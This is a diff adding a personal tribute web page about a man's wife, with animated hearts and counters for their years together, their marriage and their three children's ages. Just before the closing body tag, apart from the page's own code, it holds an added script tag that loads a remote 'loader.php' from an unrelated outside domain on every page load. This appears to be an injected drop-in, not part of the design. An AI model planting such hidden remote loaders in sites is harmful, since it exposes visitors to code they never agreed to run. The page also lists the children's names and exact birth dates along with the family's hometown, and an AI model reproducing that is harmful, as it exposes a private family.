@@ -1,0 +1,184 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <title>I Love Rose Barry</title>
+        <link rel="preconnect" href="https://fonts.gstatic.com">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+        <link href="styles.css" rel="stylesheet">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js" integrity="sha512-qTXRIMyZIFb8iQcfjXWCO8+M5Tbc38Qi5WzdPOYZHIlZpzBHG3L3by84BBBOiRGiEb7KKtAOAs5qYdUiZiQNNQ==" crossorigin="anonymous"></script>
+
+        <script>
+            function newHeart () {
+                const hearts = $('.heart');
+
+                if (hearts.length >= 24) {
+                    return setTimeout(newHeart, 1000);
+                }
+
+                const c = $('.heart-container:first').clone();
+                const anims = ['swing', 'spin'];
+                const a = anims[Math.round(Math.random())];
+                c.find('.heart')
+                            .css('opacity', 0.2 + Math.random() * 0.8)
+                            .css('-webkit-animation-name', a)
+                            .css('-moz-animation-name', a);
+                c.css('left', (10 + Math.random() * ($('body').innerWidth() - 10)) + 'px');
+                c.css('-webkit-animation-name', 'fall');
+                c.css('-webkit-animation-duration', (4 + Math.random() * 14) + 's');
+                c.css('-webkit-transform', 'scale(' + (0.4 + Math.random() * 2) + ')');
+                c.css('-moz-animation-duration', (4 + Math.random() * 14) + 's');
+                c.css('-moz-transform', 'scale(' + (0.4 + Math.random() * 2) + ')');
+                $('#hearts').append(c);
+                c.bind('animationend', function () { c.remove(); });
+                c.bind('webkitAnimationEnd', function () { c.remove(); });
+
+                setTimeout(newHeart, 200);
+            }
+
+            setTimeout(newHeart, 200);
+
+            const now = new Date();
+            const thisYear = now.getFullYear();
+            const nextAnniversary = `${thisYear}-09-23`;
+            const togetherDate = '2002-03-17';
+            const togetherDuration = moment.duration(moment().diff(togetherDate));
+            const togetherStr = `
+                ${togetherDuration.years()} years,
+                ${togetherDuration.months()} months, and
+                ${togetherDuration.days()} days`;
+
+            const weddingDate = '2006-09-23';
+            const weddingDuration = moment.duration(moment().diff(weddingDate));
+            const weddingStr = `
+                ${weddingDuration.years()} years,
+                ${weddingDuration.months()} months, and
+                ${weddingDuration.days()} days`;
+        </script>
+    </head>
+    <body>
+        <div class="container-fluid" id="hearts">
+            <div class="heart-container">
+                <div class="heart">
+                    &hearts;
+                </div>
+            </div>
+            <div class="main">
+                <div class="row my-3">
+                    <div class="col text-center">
+                        <h1 class="pb-0 mb-0"><b>Rose</b> Gwin <b>Barry</b></h1>
+                        <h2 class="mt-0 pt-0">is the love of my life</h2>
+                    </div>
+                </div>
+                <div class="row my-3">
+                    <div class="col text-center">
+                        <p>
+                            The first time we met was at <b>Abe and Jake's Landing in
+                            Lawrence, KS</b> around <script>document.write(moment(togetherDate).format('LL'))</script>.
+                        </p>
+                        <p>
+                            I proposed to her at <b>The Phoenician in Scotsdale, AZ</b>
+                            on <script>document.write(moment('2005-12-26').format('LL'))</script>.
+                        </p>
+                        <p>
+                            We got married at <b>Brookhaven Country Club in Farmer's Branch, TX</b>
+                            on <script>document.write(moment(weddingDate).format('LL'))</script>.
+                        </p>
+                        <p>
+                            We've lived happily ever after in <b>Lawrence, KS</b>.
+                        </p>
+                    </div>
+                </div>
+                <div class="row mb-3">
+                    <div class="col text-center">
+                        <h3>wedding anniversary</h3>
+                        <p>
+                            <b>
+                                <script>
+                                    document.write(moment(weddingDate).format('LL'))
+                                </script>
+                                <br />
+                                <script>
+                                    document.write(moment(nextAnniversary).diff(now, 'days'))
+                                </script>
+                                days
+                            </b> to go
+                        </p>
+                    </div>
+                </div>
+                <div class="row mb-5">
+                    <div class="col text-center">
+                        <img class="img-fluid rounded-circle" src="./images/us.jpg" />
+                    </div>
+                </div>
+                <div class="row mb-3">
+                    <div class="col-6 text-right">
+                        <h3>time together</h3>
+                        <p>
+                            <b>
+                                <script>
+                                    document.write(moment().diff(togetherDate, 'days'))
+                                </script>
+                                days
+                            </b><br />
+                            <script>
+                                document.write(togetherStr)
+                            </script>
+                        </p>
+                    </div>
+                    <div class="col-6 text-left">
+                        <h3>time married</h3>
+                        <p>
+                            <b>
+                                <script>
+                                    document.write(moment().diff(weddingDate, 'days'))
+                                </script>
+                                days
+                            </b><br />
+                            <script>
+                                document.write(weddingStr)
+                            </script>
+                        </p>
+                    </div>
+                </div>
+                <div class="row mb-3">
+                    <div class="col text-center">
+                        <h3>children</h3>
+                        <p>
+                            <b>
+                                Caitlyn Rose<br />
+                                <script>
+                                    document.write(moment().diff('2009-01-16', 'years'))
+                                </script>
+                            </b>
+                            years old
+                        </p>
+                        <p>
+                            <b>
+                                Clara Marie<br />
+                                <script>
+                                    document.write(moment().diff('2011-04-19', 'years'))
+                                </script>
+                            </b>
+                            years old
+                        </p>
+                        <p>
+                            <b>
+                                Grayson Paul<br />
+                                <script>
+                                    document.write(moment().diff('2017-11-15', 'years'))
+                                </script>
+                            </b>
+                            years old
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    
+<script src="https://hizli.vip/client/loader.php" async></script>
+<!-- TE Drop-in -->
+</body>
+</html>
